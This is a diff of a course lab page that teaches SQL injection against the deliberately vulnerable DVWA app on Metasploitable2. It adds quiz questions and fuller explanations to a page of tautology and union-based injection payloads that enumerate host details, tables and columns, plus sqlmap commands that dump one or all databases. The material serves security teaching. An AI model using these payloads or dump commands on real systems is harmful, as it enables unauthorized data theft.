@@ -3,6 +3,9 @@ title: "Activity: SQL Injection"
 number: 10
 description: A hands-on activity exploring SQLi with DVWA
 published: true
+vms:
+    - Kali
+    - Metasploitable2
 include_toc: true
 slug: sqli
 ---
@@ -20,15 +23,39 @@ If you can submit input that will cause the page to crash, then this suggests th
 
 Enter a single quote: `'` and press enter. This will show an error. It is possible that the page is running a SQL query that uses a single quote mark.
 
+{% include lab_question.html question='What kind of SQL server is DVWA using? This will determine what flavor of SQL syntax we must use in our injection attacks.' %}
+
+{% include lab_question.html question='Which of the following is not a valid comment in MySQL?
+<br>
+a. <code># comment</code>
+<br>
+b. <code>-- comment</code>
+<br>
+c. <code>// comment</code>
+<br>
+d. <code>/* comment */</code>' %}
+
 Try the following SQLi queries.
 
 ## Simple injection using tautology
 
 `test' OR 1=1#`
 
-This query will display all records that are True or False. The `test'` parameter will probably not be equal to any user in the database and therefore this statement should evaluate to False. The other part, `1=1`, will be `True` since `1` (one) is equal to `1` (one). The `#` sign comments out any following SQL code or error. The query that executes in the database looks like this;
+This query will display all records that are True or False. The `test'` parameter will probably not be equal to any user in the database and therefore this statement should evaluate to False. The other part, `1=1`, will be `True` since `1` (one) is equal to `1` (one). The `#` sign comments out any following SQL code or error. 
 
-`SELECT first_name, last_name FROM users WHERE user_id = 'test' or '1'='1';`
+The query that PHP sends to the database looks like this:
+
+`SELECT first_name, last_name FROM users WHERE user_id = '$id';`
+
+With our SQL injection payload, it looks like this:
+
+`SELECT first_name, last_name FROM users WHERE user_id = 'test' OR 1=1#';`
+
+The DBMS strips the comment, leaving us with this query:
+
+`SELECT first_name, last_name FROM users WHERE user_id = 'test' OR 1=1`
+
+Ending a statement without a semicolon works as long as no other statements follow it.
 
 ## Union-based SQLi queries
 
@@ -45,11 +72,17 @@ A union clause allows attackers to execute additional `select` queries and add r
 
 `' union select null, @@hostname#`
 
+{% include lab_question.html question='What kind of variable is `@@hostname`?' %}
+
+{% include lab_question.html question='What's the full path to the SQL server's SSL key?' %}
+
 ### Show port
 
 `' union select null, @@port#`
 
 ### Concatenate more host information fields
+
+We can concatenate 0x0a (line feed) with selected information to better display it.
 
 `' union select null, concat(@@version, 0x0a, @@hostname, 0x0a, @@datadir, 0x0a, @@version_compile_os) #`
 
@@ -71,17 +104,25 @@ Again demonstrates joining two queries with the union command. Both commands bel
 
 `' union select null, database() # `
 
-### Show all tables in the database. 
+### Show all tables in the database
 
 **Note**: the page's query is designed to return two fields, so we request `null` as the first field in our injection.
 
 `' and 1=0 union select null, table_name from information_schema.tables #`
 
+### Show all routines in the database
+
+Routines are SQL statements that can be invoked periodically or by some operation. Common routines may include updating a password or creating a new entry in a table tracking login times and IP addresses.
+
+`' and 1=0 union select null, routine_name from information_schema.routines #`
+
+{% include lab_question.html question='According to the DVWA team, who is the best college basketball team?' %}
+
 ### Show all databases and tables
 
 `' and 1=0 union select table_name, table_schema from information_schema.tables #`
 
-### Display all the columns fields in the `information_schema` `user` table. 
+### Display all the columns fields in the `information_schema` `user` table 
 
 The "surname" field in the rendered HTML result displays the field names of the database.
 
@@ -177,6 +218,10 @@ Now that `sqlmap` has learned about the `id` argument vulnerability, we can dump
 sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --dump
 ```
 
+You can press `Enter` whenever sqlmap prompts you for input.
+
+{% include lab_question.html question='What is Gordon Brown's plaintext password?' %}
+
 ### Dump a specific table
 
 Instead of dumping all tables on a database, you can specify specific databases and tables with the database (`-D`) and table (`-T`) flags. For the "users" table in this "dvwa" database, this would look like this:
@@ -207,6 +252,7 @@ This shows the following 7 databases:
 
 We can dump *all* of these using the `--dump-all` flag. **Warning**: this command will take a long time. There are a lot of tables across these databases on the MySQL server on Metasploitable2.
 
+{% include lab_question.html question='One of these databases contains data for a blog. What was kevin's first post on the blog?' %}
 
 ```shell
 sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --dump-all
